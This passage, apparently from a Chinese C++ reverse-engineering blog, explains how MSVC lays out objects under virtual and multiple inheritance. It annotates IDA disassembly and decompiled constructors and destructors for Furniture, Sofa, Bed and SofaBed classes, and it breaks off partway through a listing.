01&gt;SofaBed::__delDtor this adjustor: 321&gt;SofaBed::__vecDelDtor this adjustor: 321&gt;vbi:\t   class  offset o.vbptr  o.vbte fVtorDisp1&gt;       Furniture      32       4       4 0\n\n从汇编代码中的指针转换过程可以看出，虚基类偏移表指向的内存地址中保存的数据为偏移数据，对应的数据有两项：第一项为-4，即虚基类偏移表所属类对应的对象首地址相对于虚基类偏移表的偏移值；第二项保存的是虚基类对象首地址相对于虚基类偏移表的偏移值。\n虚表指针（虚函数表指针）指向的虚表包含了子类SofaBed的虚函数。有了这些记录就可以随心所欲地将虚表指针转换成任意的父类指针。在利用父类指针访问虚函数时，只能调用子类与父类共有的虚函数，子类继承自其他父类的虚函数是无法调用的，虚表中也没有相关的记录。当子类存在多个虚基类时，会在虚基类偏移表中依次记录它们的偏移量。\n虚继承结构的子类构造123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267//构造函数.text:00401440 ; _DWORD *__thiscall sub_401440(_DWORD *this, int).text:00401440 sub_401440      proc near               ; CODE XREF: _main+15↓p.text:00401440.text:00401440 var_14          = dword ptr -14h.text:00401440 var_10          = dword ptr -10h.text:00401440 var_C           = dword ptr -0Ch.text:00401440 var_4           = dword ptr -4.text:00401440 arg_0           = dword ptr  8.text:00401440 arg_4           = dword ptr  0Ch.text:00401440.text:00401440 ; FUNCTION CHUNK AT .text:004023B0 SIZE 00000027 BYTES.text:00401440 ; FUNCTION CHUNK AT .text:004023DC SIZE 0000001D BYTES.text:00401440.text:00401440 ; __unwind &#123; // SEH_401440.text:00401440                 push    ebp             ; 构造函数.text:00401441                 mov     ebp, esp.text:00401443                 push    0FFFFFFFFh.text:00401445                 push    offset SEH_401440.text:0040144A                 mov     eax, large fs:0.text:00401450                 push    eax.text:00401451                 sub     esp, 8.text:00401454                 mov     eax, ___security_cookie.text:00401459                 xor     eax, ebp.text:0040145B                 push    eax             ; char.text:0040145C                 lea     eax, [ebp-0Ch].text:0040145F                 mov     large fs:0, eax.text:00401465                 mov     [ebp-10h], ecx.text:00401468                 mov     dword ptr [ebp-14h], 0.text:0040146F                 cmp     dword ptr [ebp+8], 0.text:00401473                 jz      short loc_4014A4 ; 比较参数是否为0，为0则执行JE跳转，防止重复构造虚基类.text:00401475                 mov     eax, [ebp-10h].text:00401478                 mov     dword ptr [eax+4], offset unk_4032AC ; 设置父类Sofa中的虚基类偏移表.text:0040147F                 mov     ecx, [ebp-10h].text:00401482                 mov     dword ptr [ecx+10h], offset unk_403298 ; 设置父类Bed中的虚基类偏移表.text:00401489                 mov     ecx, [ebp-10h].text:0040148C                 add     ecx, 20h ; &#x27; &#x27;  ; 调整this指针为虚基类Furniture的this指针.text:0040148F                 call    sub_401080      ; 调用虚基类Furniture的构造函数，虚基类为最上级，它的构造函数和无继承关系的构造函数相同，这里不予分析.text:00401494 ;   try &#123;.text:00401494                 mov     dword ptr [ebp-4], 0.text:0040149B                 mov     edx, [ebp-14h].text:0040149E                 or      edx, 1.text:004014A1                 mov     [ebp-14h], edx.text:004014A4.text:004014A4 loc_4014A4:                             ; CODE XREF: sub_401440+33↑j.text:004014A4                 push    0               ; 传入0作为构造标记.text:004014A6                 mov     ecx, [ebp-10h]  ; 获取Sofa对象首地址作为this指针.text:004014A9                 call    sub_401130      ; 调用父类Sofa构造函数.text:004014A9 ;   &#125; // starts at 401494.text:004014AE ;   try &#123;.text:004014AE                 mov     dword ptr [ebp-4], 1.text:004014B5                 push    0               ; 传入0作为构造标记.text:004014B7                 mov     ecx, [ebp-10h].text:004014BA                 add     ecx, 0Ch        ; 调整this指针，获取Bed对象首地址作为this指针.text:004014BD                 call    sub_4012B0      ; 调用父类Bed构造函数.text:004014C2                 mov     eax, [ebp-10h].text:004014C5                 mov     dword ptr [eax], offset ??_7SofaBed@@6B@_1 ; const SofaBed::`vftable&#x27;.text:004014C5                                         ; 覆盖Sofa类虚表指针(新).text:004014CB                 mov     ecx, [ebp-10h].text:004014CE                 mov     dword ptr [ecx+0Ch], offset ??_7SofaBed@@6B@_0 ; const SofaBed::`vftable&#x27;.text:004014CE                                         ; 覆盖Bed类虚表指针(新).text:004014D5                 mov     edx, [ebp-10h]  ; 下面通过this指针和虚基类偏移表定位到虚基类Furniture的虚表指针.text:004014D8                 mov     eax, [edx+4]    ; 此处获取虚基类偏移表并保存至eax.text:004014DB                 mov     ecx, [eax+4]    ; 此处获取虚基类虚表指针（虚基类首地址）相对于虚基类偏移表的偏移并保存至ecx.text:004014DE                 mov     edx, [ebp-10h]  ; 获取this指针.text:004014E1                 mov     dword ptr [edx+ecx+4], offset ??_7SofaBed@@6B@ ; const SofaBed::`vftable&#x27;.text:004014E1                                         ; 覆盖Furniture类虚表指针(新).text:004014E1                                         ; edx=sofa_vfptr,ecx=Furniture_vfptr-sofa_vbptr.text:004014E1                                         ; 所以sofa_vbptr=sofa_vfptr+4=edx+4.text:004014E1                                         ; 所以Furniture_vfptr=ecx+sofa_vbptr=ecx+edx+4.text:004014E9                 push    offset aSofabedSofabed ; &quot;SofaBed::SofaBed()\\n&quot;   ; 下面执行SofaBed构造函数内的代码.text:004014EE                 call    printf.text:004014F3                 add     esp, 4.text:004014F6                 mov     eax, [ebp-10h].text:004014F9                 mov     dword ptr [eax+1Ch], 6.text:004014F9 ;   &#125; // starts at 4014AE.text:00401500                 mov     dword ptr [ebp-4], 0FFFFFFFFh.text:00401507                 mov     eax, [ebp-10h].text:0040150A                 mov     ecx, [ebp-0Ch].text:0040150D                 mov     large fs:0, ecx.text:00401514                 pop     ecx.text:00401515                 mov     esp, ebp.text:00401517                 pop     ebp.text:00401518                 retn    4.text:00401518 ; &#125; // starts at 401440.text:00401518 sub_401440      endp_DWORD *__thiscall sub_401440(_DWORD *this, int a2)&#123;  if ( a2 )  &#123;    this[1] = &amp;unk_4032AC;    this[4] = &amp;unk_403298;    sub_401080((_BYTE)this + 32);  &#125;  sub_401130(0);  sub_4012B0(0);  *this = &amp;SofaBed::`vftable&#x27;;  this[3] = &amp;SofaBed::`vftable&#x27;;  *(_DWORD *)((char *)this + *(_DWORD *)(this[1] + 4) + 4) = &amp;SofaBed::`vftable&#x27;;  printf(&quot;SofaBed::SofaBed()\\n&quot;);  this[7] = 6;  return this;&#125;//虚基类Furniture构造函数.text:00401080 ; _DWORD *__fastcall sub_401080(_DWORD *).text:00401080 sub_401080      proc near               ; CODE XREF: sub_401130+26↓p.text:00401080                                         ; sub_4012B0+26↓p ....text:00401080.text:00401080 var_4           = dword ptr -4.text:00401080.text:00401080                 push    ebp            ; 虚基类Furniture构造函数.text:00401081                 mov     ebp, esp.text:00401083                 push    ecx             ; char.text:00401084                 mov     [ebp+var_4], ecx.text:00401087                 mov     eax, [ebp+var_4].text:0040108A                 mov     dword ptr [eax], offset ??_7Furniture@@6B@ ; 设置虚表指针为Furniture虚表.text:00401090                 push    offset Format   ; 执行Furniture构造函数内的代码.text:00401095                 call    printf.text:0040109A                 add     esp, 4.text:0040109D                 mov     ecx, [ebp+var_4].text:004010A0                 mov     dword ptr [ecx+4], 0.text:004010A7                 mov     eax, [ebp+var_4].text:004010AA                 mov     esp, ebp.text:004010AC                 pop     ebp.text:004010AD                 retn.text:004010AD sub_401080      endp_DWORD *__fastcall sub_401080(_DWORD *a1)&#123;  *a1 = &amp;Furniture::`vftable&#x27;;  printf(&quot;Furniture::Furniture()\\n&quot;);  a1[1] = 0;  return a1;&#125;//父类Sofa构造函数.text:00401130 ; _DWORD *__thiscall sub_401130(_DWORD *this, int).text:00401130 sub_401130      proc near               ; CODE XREF: sub_401440+69↓p.text:00401130.text:00401130 var_8           = dword ptr -8.text:00401130 var_4           = dword ptr -4.text:00401130 arg_0           = dword ptr  8.text:00401130.text:00401130                 push    ebp             ; 父类Sofa构造函数.text:00401131                 mov     ebp, esp.text:00401133                 sub     esp, 8.text:00401136                 mov     [ebp-4], ecx    ; 保存this指针.text:00401139                 mov     dword ptr [ebp-8], 0.text:00401140                 cmp     dword ptr [ebp+8], 0 ; 判断是否要构造虚基类，0为不构造.text:00401144                 jz      short loc_401164.text:00401146                 mov     eax, [ebp-4].text:00401149                 mov     dword ptr [eax+4], offset unk_403258 ; 设置父类Sofa中的虚基类偏移表.text:00401150                 mov     ecx, [ebp-4].text:00401153                 add     ecx, 0Ch        ; 获取虚基类Furniture对象的首地址.text:00401156                 call    sub_401080      ; 调用虚基类Furniture的构造函数.text:0040115B                 mov     ecx, [ebp-8].text:0040115E                 or      ecx, 1.text:00401161                 mov     [ebp-8], ecx.text:00401164.text:00401164 loc_401164:                             ; CODE XREF: sub_401130+14↑j.text:00401164                 mov     edx, [ebp-4].text:00401167                 mov     dword ptr [edx], offset ??_7Sofa@@6B@_0 ; 设置虚表指针为自身（Sofa）虚表.text:0040116D                 mov     eax, [ebp-4]    ; 下面通过this指针和虚基类偏移表定位到虚基类Furniture的虚表指针.text:00401170                 mov     ecx, [eax+4]    ; 此处获取虚基类偏移表并保存至ecx.text:00401173                 mov     edx, [ecx+4]    ; 此处获取虚基类虚表指针（虚基类首地址）相对于虚基类偏移表的偏移并保存至edx.text:00401176                 mov     eax, [ebp-4].text:00401179                 mov     dword ptr [eax+edx+4], offset ??_7Sofa@@6B@ ; 用Sofa虚表指针覆盖Furniture类虚表指针.text:00401181                 push    offset aSofaSofa ; 执行Sofa构造函数内的代码.text:00401186                 call    printf.text:0040118B                 add     esp, 4.text:0040118E                 mov     ecx, [ebp-4].text:00401191                 mov     edx, [ecx+4].text:00401194                 mov     eax, [edx+4].text:00401197                 mov     ecx, [ebp-4].text:0040119A                 mov     dword ptr [ecx+eax+8], 1.text:004011A2                 mov     edx, [ebp-4].text:004011A5                 mov     dword ptr [edx+8], 2.text:004011AC                 mov     eax, [ebp-4].text:004011AF                 mov     esp, ebp.text:004011B1                 pop     ebp.text:004011B2                 retn    4.text:004011B2 sub_401130      endp_DWORD *__thiscall sub_401130(_DWORD *this, int a2)&#123;  if ( a2 )  &#123;    this[1] = &amp;unk_403258;    sub_401080(this + 3);  &#125;  *this = &amp;Sofa::`vftable&#x27;;  *(_DWORD *)((char *)this + *(_DWORD *)(this[1] + 4) + 4) = &amp;Sofa::`vftable&#x27;;  printf(&quot;Sofa::Sofa()\\n&quot;);  *(_DWORD *)((char *)this + *(_DWORD *)(this[1] + 4) + 8) = 1;  this[2] = 2;  return this;&#125;//父类Bed构造函数.text:004012B0 ; _DWORD *__thiscall sub_4012B0(_DWORD *this, int).text:004012B0 sub_4012B0      proc near               ; CODE XREF: sub_401440+7D↓p.text:004012B0.text:004012B0 var_8           = dword ptr -8.text:004012B0 var_4           = dword ptr -4.text:004012B0 arg_0           = dword ptr  8.text:004012B0.text:004012B0                 push    ebp             ; 父类Bed构造函数.text:004012B1                 mov     ebp, esp.text:004012B3                 sub     esp, 8.text:004012B6                 mov     [ebp-4], ecx    ; 保存this指针.text:004012B9                 mov     dword ptr [ebp-8], 0.text:004012C0                 cmp     dword ptr [ebp+8], 0 ; 判断是否要构造虚基类，0为不构造.text:004012C4                 jz      short loc_4012E4.text:004012C6                 mov     eax, [ebp-4].text:004012C9                 mov     dword ptr [eax+4], offset unk_40326C ; 设置父类Sofa中的虚基类偏移表.text:004012D0                 mov     ecx, [ebp-4].text:004012D3                 add     ecx, 10h        ; 获取虚基类Furniture对象的首地址.text:004012D6                 call    sub_401080      ; 调用虚基类Furniture的构造函数.text:004012DB                 mov     ecx, [ebp-8].text:004012DE                 or      ecx, 1.text:004012E1                 mov     [ebp-8], ecx.text:004012E4.text:004012E4 loc_4012E4:                             ; CODE XREF: sub_4012B0+14↑j.text:004012E4                 mov     edx, [ebp-4].text:004012E7                 mov     dword ptr [edx], offset ??_7Bed@@6B@ ; 设置虚表指针为自身（Bed）虚表.text:004012ED                 mov     eax, [ebp-4]    ; 下面通过this指针和虚基类偏移表定位到虚基类Furniture的虚表指针.text:004012F0                 mov     ecx, [eax+4]    ; 此处获取虚基类偏移表并保存至ecx.text:004012F3                 mov     edx, [ecx+4]    ; 此处获取虚基类虚表指针（虚基类首地址）相对于虚基类偏移表的偏移并保存至edx.text:004012F6                 mov     eax, [ebp-4].text:004012F9                 mov     dword ptr [eax+edx+4], offset ??_7Bed@@6B@_0 ; 用Bed虚表指针覆盖Furniture类虚表指针.text:00401301                 push    offset aBedBed  ; 执行Bed构造函数内的代码.text:00401306                 call    printf.text:0040130B                 add     esp, 4.text:0040130E                 mov     ecx, [ebp-4].text:00401311                 mov     edx, [ecx+4].text:00401314                 mov     eax, [edx+4].text:00401317                 mov     ecx, [ebp-4].text:0040131A                 mov     dword ptr [ecx+eax+8], 3.text:00401322                 mov     edx, [ebp+var_4].text:00401325                 mov     dword ptr [edx+8], 4.text:0040132C                 mov     eax, [ebp-4].text:0040132F                 mov     dword ptr [eax+0Ch], 5.text:00401336                 mov     eax, [ebp-4].text:00401339                 mov     esp, ebp.text:0040133B                 pop     ebp.text:0040133C                 retn    4.text:0040133C sub_4012B0      end_DWORD *__thiscall sub_4012B0(_DWORD *this, int a2)&#123;  if ( a2 )  &#123;    this[1] = &amp;unk_40326C;    sub_401080(this + 4);  &#125;  *this = &amp;Bed::`vftable&#x27;;  *(_DWORD *)((char *)this + *(_DWORD *)(this[1] + 4) + 4) = &amp;Bed::`vftable&#x27;;  printf(&quot;Bed::Bed()\\n&quot;);  *(_DWORD *)((char *)this + *(_DWORD *)(this[1] + 4) + 8) = 3;  this[2] = 4;  this[3] = 5;  return this;&#125;\n\n汇编代码5展示了子类SofaBed的构造过程，在VS和Clang编译器中，它的特别之处在于调用时要传入一个参数。这个参数是一个标志信息，构造过程中要先构造父类，然后构造自己。SofaBed的两个父类有一个共同的父类，如果没有构造标记，它们共同的父类将会被构造两次，因此需要使用构造标记防止重复构造的问题，构造顺序如下所示。\n1234567FurnitureSofa（根据标记跳过Furniture构造）Bed（根据标记跳过Furniture构造）SofaBed自身\n\nSofaBed也使用了构造标记，当SofaBed是父类时，这个标记将产生作用，跳过所有父类的构造，只构造自身。当标记为1时，构造父类；当标记为0时，跳过构造函数。对于GCC编译器，并没有采用构造标记方案，编译器会生成一个父类构造代理函数，该构造函数不会调用虚基类构造函数；对于正常实例化的父类对象，GCC编译器不会调用该构造代理函数。\n虚继承结构的子类析构123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174//析构代理函数.text:00401620 ; int __thiscall std::iostream::`vbase destructor&#x27;(void *this).text:00401620 ??_D?$basic_iostream@DU?$char_traits@D@std@@@std@@QAEXXZ proc near.text:00401620                                         ; CODE XREF: sub_4015E0+D↑p.text:00401620                                         ; _main+85↓p.text:00401620.text:00401620 var_4           = dword ptr -4.text:00401620.text:00401620                 push    ebp             ; 析构代理函数.text:00401621                 mov     ebp, esp.text:00401623                 push    ecx.text:00401624                 mov     [ebp-4], ecx.text:00401627                 mov     ecx, [ebp-4].text:0040162A                 add     ecx, 20h ; &#x27; &#x27;  ; 调整this指针为虚基类.text:0040162D                 call    sub_401520      ; 调用SofaBed的析构函数.text:00401632                 mov     ecx, [ebp-4].text:00401635                 add     ecx, 20h ; &#x27; &#x27;  ; 调整this指针为虚基类.text:00401638                 call    sub_4010B0      ; 调用虚基类Furniture的析构函数.text:0040163D                 mov     esp, ebp.text:0040163F                 pop     ebp.text:00401640                 retn.text:00401640 ??_D?$basic_iostream@DU?$char_traits@D@std@@@std@@QAEXXZ endpint __thiscall std::iostream::`vbase destructor&#x27;(void *this)&#123;  char v2; // [esp+0h] [ebp-4h]  v2 = (char)this;  sub_401520((int)this + 32);  return sub_4010B0(v2 + 32);&#125;//SofaBed的析构函数.text:00401520 ; int __fastcall sub_401520(int).text:00401520 sub_401520      proc near               ; CODE XREF: std::iostream::`vbase destructor&#x27;(void)+D↓p.text:00401520.text:00401520 var_4           = dword ptr -4.text:00401520.text:00401520                 push    ebp.text:00401521                 mov     ebp, esp.text:00401523                 push    ecx             ; char.text:00401524                 mov     [ebp-4], ecx    ; 保存this指针，此时this指针指向虚基类.text:00401527                 mov     eax, [ebp-4].text:0040152A                 mov     dword ptr [eax-20h], offset ??_7SofaBed@@6B@_1 ; const SofaBed::`vftable&#x27;.text:0040152A                                         ; 调整this指针为Sofa，还原虚表指针为SofaBed.text:00401531                 mov     ecx, [ebp-4].text:00401534                 mov     dword ptr [ecx-14h], offset ??_7SofaBed@@6B@_0 ; const SofaBed::`vftable&#x27;.text:00401534                                         ; 调整this指针为Bed，还原虚表指针为SofaBed.text:0040153B                 mov     edx, [ebp-4].text:0040153E                 mov     eax, [edx-1Ch]  ; 获取Sofa类的虚基类偏移表.text:00401541                 mov     ecx, [eax+4]    ; 从虚基类偏移表中获取虚基类偏移.text:00401544                 mov     edx, [ebp-4].text:00401547                 mov     dword ptr [edx+ecx-1Ch], offset ??_7SofaBed@@6B@ ; const SofaBed::`vftable&#x27;.text:00401547                                         ; 调整this指针为虚基类，还原虚表指针为SofaBed，到此为止，3个虚表指针还原完毕，执行析构函数内的代码.text:0040154F                 push    offset aSofabedSofabed_0 ; &quot;SofaBed::~SofaBed()\\n&quot;.text:00401554                 call    printf.text:00401559                 add     esp, 4.text:0040155C                 mov     ecx, [ebp-4].text:0040155F                 sub     ecx, 4          ; 调整指针到已析构的位置（即SofaBed自身内容的首地址）.text:00401562                 call    sub_401340      ; 调用父类Bed析构函数.text:00401567                 mov     ecx, [ebp-4].text:0040156A                 sub     ecx, 14h        ; 调整指针到已析构的位置（即Bed自身内容的首地址）.text:0040156D                 call    sub_4011C0      ; 调用父类Sofa析构函数.text:00401572                 mov     esp, ebp.text:00401574                 pop     ebp.text:00401575                 retn.text:00401575 sub_401520      endpint __fastcall sub_401520(int a1)&#123;  char v2; // [esp+0h] [ebp-4h]  v2 = a1;  *(_DWORD *)(a1 - 32) = &amp;SofaBed::`vftable&#x27;;  *(_DWORD *)(a1 - 20) = &amp;SofaBed::`vftable&#x27;;  *(_DWORD *)(a1 + *(_DWORD *)(*(_DWORD *)(a1 - 28) + 4) - 28) = &amp;SofaBed::`vftable&#x27;;  printf(&quot;SofaBed::~SofaBed()\\n&quot;);  sub_401340(v2 - 4);  return sub_4011C0(v2 - 20);&#125;//父类Bed析构函数.text:00401340 ; int __fastcall sub_401340(int).text:00401340 sub_401340      proc near               ; CODE XREF: sub_401410+D↓p.text:00401340                                         ; sub_401520+42↓p.text:00401340.text:00401340 var_4           = dword ptr -4.text:00401340.text:00401340                 push    ebp.text:00401341                 mov     ebp, esp.text:00401343                 push    ecx             ; char.text:00401344                 mov     [ebp-4], ecx.text:00401347                 mov     eax, [ebp-4].text:0040134A                 mov     dword ptr [eax-10h], offset ??_7Bed@@6B@ ; 调整this指针为Bed，还原虚表指针为Bed.text:00401351                 mov     ecx, [ebp-4].text:00401354                 mov     edx, [ecx-0Ch]  ; 获取Bed虚基类偏移表并保存至edx.text:00401357                 mov     eax, [edx+4]    ; 获取虚基类对象首地址相对于虚基类偏移表的偏移并保存至eax.text:0040135A                 mov     ecx, [ebp-4].text:0040135D                 mov     dword ptr [ecx+eax-0Ch], offset ??_7Bed@@6B@_0 ; 调整this指针为虚基类，还原虚表指针为Bed.text:00401365                 push    offset aBedBed_0 ; 执行析构函数内代码.text:0040136A                 call    printf.text:0040136F                 add     esp, 4.text:00401372                 mov     esp, ebp.text:00401374                 pop     ebp.text:00401375                 retn.text:00401375 sub_401340      endpint __fastcall sub_401340(int a1)&#123;  *(_DWORD *)(a1 - 16) = &amp;Bed::`vftable&#x27;;  *(_DWORD *)(a1 + *(_DWORD *)(*(_DWORD *)(a1 - 12) + 4) - 12) = &amp;Bed::`vftable&#x27;;  return printf(&quot;Bed::~Bed()\\n&quot;);&#125;//父类Sofa析构函数.text:004011C0 ; int __fastcall sub_4011C0(int).text:004011C0 sub_4011C0      proc near               ; CODE XREF: sub_401280+D↓p.text:004011C0                                         ; sub_401520+4D↓p ....text:004011C0.text:004011C0 var_4           = dword ptr -4.text:004011C0.text:004011C0                 push    ebp.text:004011C1                 mov     ebp, esp.text:004011C3                 push    ecx             ; char.text:004011C4                 mov     [ebp-4], ecx.text:004011C7                 mov     eax, [ebp-4].text:004011CA                 mov     dword ptr [eax-0Ch], offset ??_7Sofa@@6B@_0 ; 调整this指针为Sofa，还原虚表指针为Sofa.text:004011D1                 mov     ecx, [ebp-4].text:004011D4                 mov     edx, [ecx-8]    ; 获取Sofa虚基类偏移表并保存至edx.text:004011D7                 mov     eax, [edx+4]    ; 获取虚基类对象首地址相对于虚基类偏移表的偏移并保存至eax.text:004011DA                 mov     ecx, [ebp-4].text:004011DD                 mov     dword ptr [ecx+eax-8], offset ??_7Sofa@@6B@ ; 调整this指针为虚基类，还原虚表指针为Sofa.text:004011E5                 push    offset aSofaSofa_0 ; 执行析构函数内代码.text:004011EA                 call    printf.text:004011EF                 add     esp, 4.text:004011F2                 mov     esp, ebp.text:004011F4                 pop     ebp.text:004011F5                 retn.text:004011F5 sub_4011C0      endpint __fastcall sub_4011C0(int a1)&#123;  *(_DWORD *)(a1 - 12) = &amp;Sofa::`vftable&#x27;;  *(_DWORD *)(a1 + *(_DWORD *)(*(_DWORD *)(a1 - 8) + 4) - 8) = &amp;Sofa::`vftable&#x27;;  return printf(&quot;Sofa::~Sofa()\\n&quot;);&#125;//虚基类Furniture的析构函数.text:004010B0 ; int __fastcall sub_4010B0(_DWORD *).text:004010B0 sub_4010B0      proc near               ; CODE XREF: sub_401100+A↓p.text:004010B0                                         ; sub_401280+18↓p ....text:004010B0.text:004010B0 var_4           = dword ptr -4.text:004010B0.text:004010B0                 push    ebp.text:004010B1                 mov     ebp, esp.text:004010B3                 push    ecx             ; char.text:004010B4                 mov     [ebp-4], ecx.text:004010B7                 mov     eax, [ebp-4].text:004010BA                 mov     dword ptr [eax], offset ??_7Furniture@@6B@ ; 将虚表设置为Furniture虚基类的虚表.text:004010C0                 push    offset aFurnitureFurni_0 ; 下面执行虚基类析构函数内的代码.text:004010C5                 call    printf.text:004010CA                 add     esp, 4.text:004010CD                 mov     esp, ebp.text:004010CF                 pop     ebp.text:004010D0                 retn.text:004010D0 sub_4010B0      endpint __fastcall sub_4010B0(_DWORD *a1)&#123;  *a1 = &amp;Furniture::`vftable&#x27;;  return printf(&quot;Furniture::~Furniture()\\n&quot;);&#125;\n\n根据上面汇编代码的分析可知，虚继承结构中子类的析构函数执行流程并没有像构造函数那样使用标记防止重复析构，而是将虚基类放在最后调用。先依次执行两个父类Bed和Sofa的析构函数，然后执行虚基类的析构函数。\n总结为什么编译器要在子类析构函数中再次将虚表设置为子类虚表呢？\n这个操作非常必要，因为编译器无法预知这个子类以后是否会被其他类继承，如果被继承，原来的子类就成了父类，在执行析构函数时会先执行当前对象的析构函数，然后向祖父类的方向按继承线路逐层调用各类析构函数，当前对象的析构函数开始执行时，其虚表也是当前对象的，所以执行到父类的析构函数时，虚表必须改写为父类的虚表。编译器产生的类实现代码，必须能够适应将来不可预知的对象关系，故在每个对象的析构函数内，要加入自己虚表的代码。\n","slug":"C++逆向——抽象类与虚继承","date":"2023-03-03T08:12:53.000Z","categories_index":"","tags_index":"c++逆向","author_index":"0netry"},{"id":"9301d0d9fdad61b6c1164e4bbd50c3da","title":"C++逆向——多重继承","content":"当子类拥有多个父类（如类C继承自类A同时也继承自类B）时，便构成了多重继承关系。在多重继承的情况下，子类继承的父类变为多个，但其结构与单一继承相似。\n多重继承类的定义123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Sofa &#123;public:\tSofa() &#123;\t\tcolor = 2;\t&#125;\tvirtual ~Sofa() &#123; // 沙发类虚析构函数\t\tprintf(&quot;virtual ~Sofa()\\n&quot;);\t&#125;\tvirtual int getColor() &#123; // 获取沙发颜色\t\treturn color;\t&#125;\tvirtual int sitDown() &#123; // 沙发可以坐下休息\t\treturn printf(&quot;Sit down and rest your legs\\r\\n&quot;);\t&#125;protected:\tint color; // 沙发类成员变量&#125;;//定义床类class Bed &#123;public:\tBed() &#123;\t\tlength = 4;\t\twidth = 5;\t&#125;\tvirtual ~Bed() &#123; //床类虚析构函数\t\tprintf(&quot;virtual ~Bed()\\n&quot;);\t&#125;\tvirtual int getArea() &#123; //获取床面积\t\treturn length * width;\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;go to sleep\\r\\n&quot;);\t&#125;protected:\tint length; //床类成员变量\tint width;&#125;;//子类沙发床定义，派生自Sofa类和Bed类class SofaBed : public Sofa, public Bed &#123;public:\tSofaBed() &#123;\t\theight = 6;\t&#125;\tvirtual ~SofaBed() &#123; //沙发床类的虚析构函数\t\tprintf(&quot;virtual ~SofaBed()\\n&quot;);\t&#125;\tvirtual int sitDown() &#123; //沙发可以坐下休息\t\treturn printf(&quot;Sit down on the sofa bed\\r\\n&quot;);\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;go to sleep on the sofa bed\\r\\n&quot;);\t&#125;\tvirtual int getHeight() &#123;\t\treturn height;\t&#125;protected:\tint height;&#125;;int main(int argc, char* argv[]) &#123;\tSofaBed sofabed;\treturn 0;&#125;\n\n上面代码中定义了两个父类：沙发类和床类，通过多重继承，以它们为父类派生出沙发类，它们拥有各自的属性及方法。main()函数中定义了子类SofaBed的对象，其中包含两个父类的数据成员，，此时SofaBed在内存中占多少字节呢？\n\n由上图可知，对象SofaBed占用的内存空间大小为0x18字节。\n这些数据的内容是什么？它们又是如何存放在内存中的？具体如下图：\n\n如上图所示，对象SofaBed的首地址在0x003af850处，在图中可看到子类和两个父类中的数据成员。数据成员的排列顺序由继承父类的顺序决定，从左向右依次排列。除此之外，还剩余两个地址值，分别为0x004e31e8与0x004e31b8，这两个地址如下图所示。\n\n上图显示了两个虚表指针指向的虚表信息。查看两个虚表信息会发现，这两个虚表保存了子类的虚函数与父类的虚函数，父类的这些虚函数都是子类中没有实现的。由此可见，编译器制作了两份子类SofaBed的虚函数。\n为什么会产生两份虚函数呢？我们先从对象SofaBed的构造入手，循序渐进地分析\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102//main函数.text:00401370 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401370 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401370.text:00401370 var_20          = dword ptr -20h.text:00401370 var_1C          = byte ptr -1Ch.text:00401370 var_4           = dword ptr -4.text:00401370 argc            = dword ptr  8.text:00401370 argv            = dword ptr  0Ch.text:00401370 envp            = dword ptr  10h.text:00401370.text:00401370                 push    ebp.text:00401371                 mov     ebp, esp.text:00401373                 sub     esp, 20h.text:00401376                 mov     eax, ___security_cookie.text:0040137B                 xor     eax, ebp.text:0040137D                 mov     [ebp-4], eax.text:00401380                 lea     ecx, [ebp-1Ch]  ; 传递this指针.text:00401383                 call    sub_401220      ; 调用构造函数.text:00401388                 mov     dword ptr [ebp-20h], 0.text:0040138F                 lea     ecx, [ebp-1Ch]  ; 传递this指针.text:00401392                 call    sub_4012A0      ; 调用析构函数.text:00401397                 mov     eax, [ebp-20h].text:0040139A                 mov     ecx, [ebp-4].text:0040139D                 xor     ecx, ebp        ; StackCookie.text:0040139F                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004013A4                 mov     esp, ebp.text:004013A6                 pop     ebp.text:004013A7                 retn.text:004013A7 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4; // [esp+4h] [ebp-1Ch] BYREF  sub_401220();  sub_4012A0((char)&amp;v4);  return 0;&#125;//构造函数.text:00401220 ; _DWORD *__thiscall sub_401220(_DWORD *this).text:00401220 sub_401220      proc near               ; CODE XREF: _main+13↓p.text:00401220.text:00401220 var_10          = byte ptr -10h.text:00401220 var_C           = dword ptr -0Ch.text:00401220 var_4           = dword ptr -4.text:00401220 arg_4           = dword ptr  0Ch.text:00401220.text:00401220 ; FUNCTION CHUNK AT .text:00402070 SIZE 00000008 BYTES.text:00401220 ; FUNCTION CHUNK AT .text:0040207D SIZE 0000001D BYTES.text:00401220.text:00401220 ; __unwind &#123; // SEH_401220.text:00401220                 push    ebp.text:00401221                 mov     ebp, esp.text:00401223                 push    0FFFFFFFFh.text:00401225                 push    offset SEH_401220.text:0040122A                 mov     eax, large fs:0.text:00401230                 push    eax.text:00401231                 push    ecx.text:00401232                 mov     eax, ___security_cookie.text:00401237                 xor     eax, ebp.text:00401239                 push    eax.text:0040123A                 lea     eax, [ebp-0Ch].text:0040123D                 mov     large fs:0, eax.text:00401243                 mov     [ebp-10h], ecx.text:00401246                 mov     ecx, [ebp-10h]  ; 以对象首地址作为this指针.text:00401249                 call    sub_401080      ; 调用父类Sofa的构造函数.text:0040124E ;   try &#123;.text:0040124E                 mov     dword ptr [ebp-4], 0.text:00401255                 mov     ecx, [ebp-10h].text:00401258                 add     ecx, 8          ; 将this指针调整到第二个虚表指针的地址处.text:0040125B                 call    sub_401150      ; 调用父类Bed的构造函数.text:00401260                 mov     eax, [ebp-10h]  ; 获取对象的首地址.text:00401263                 mov     dword 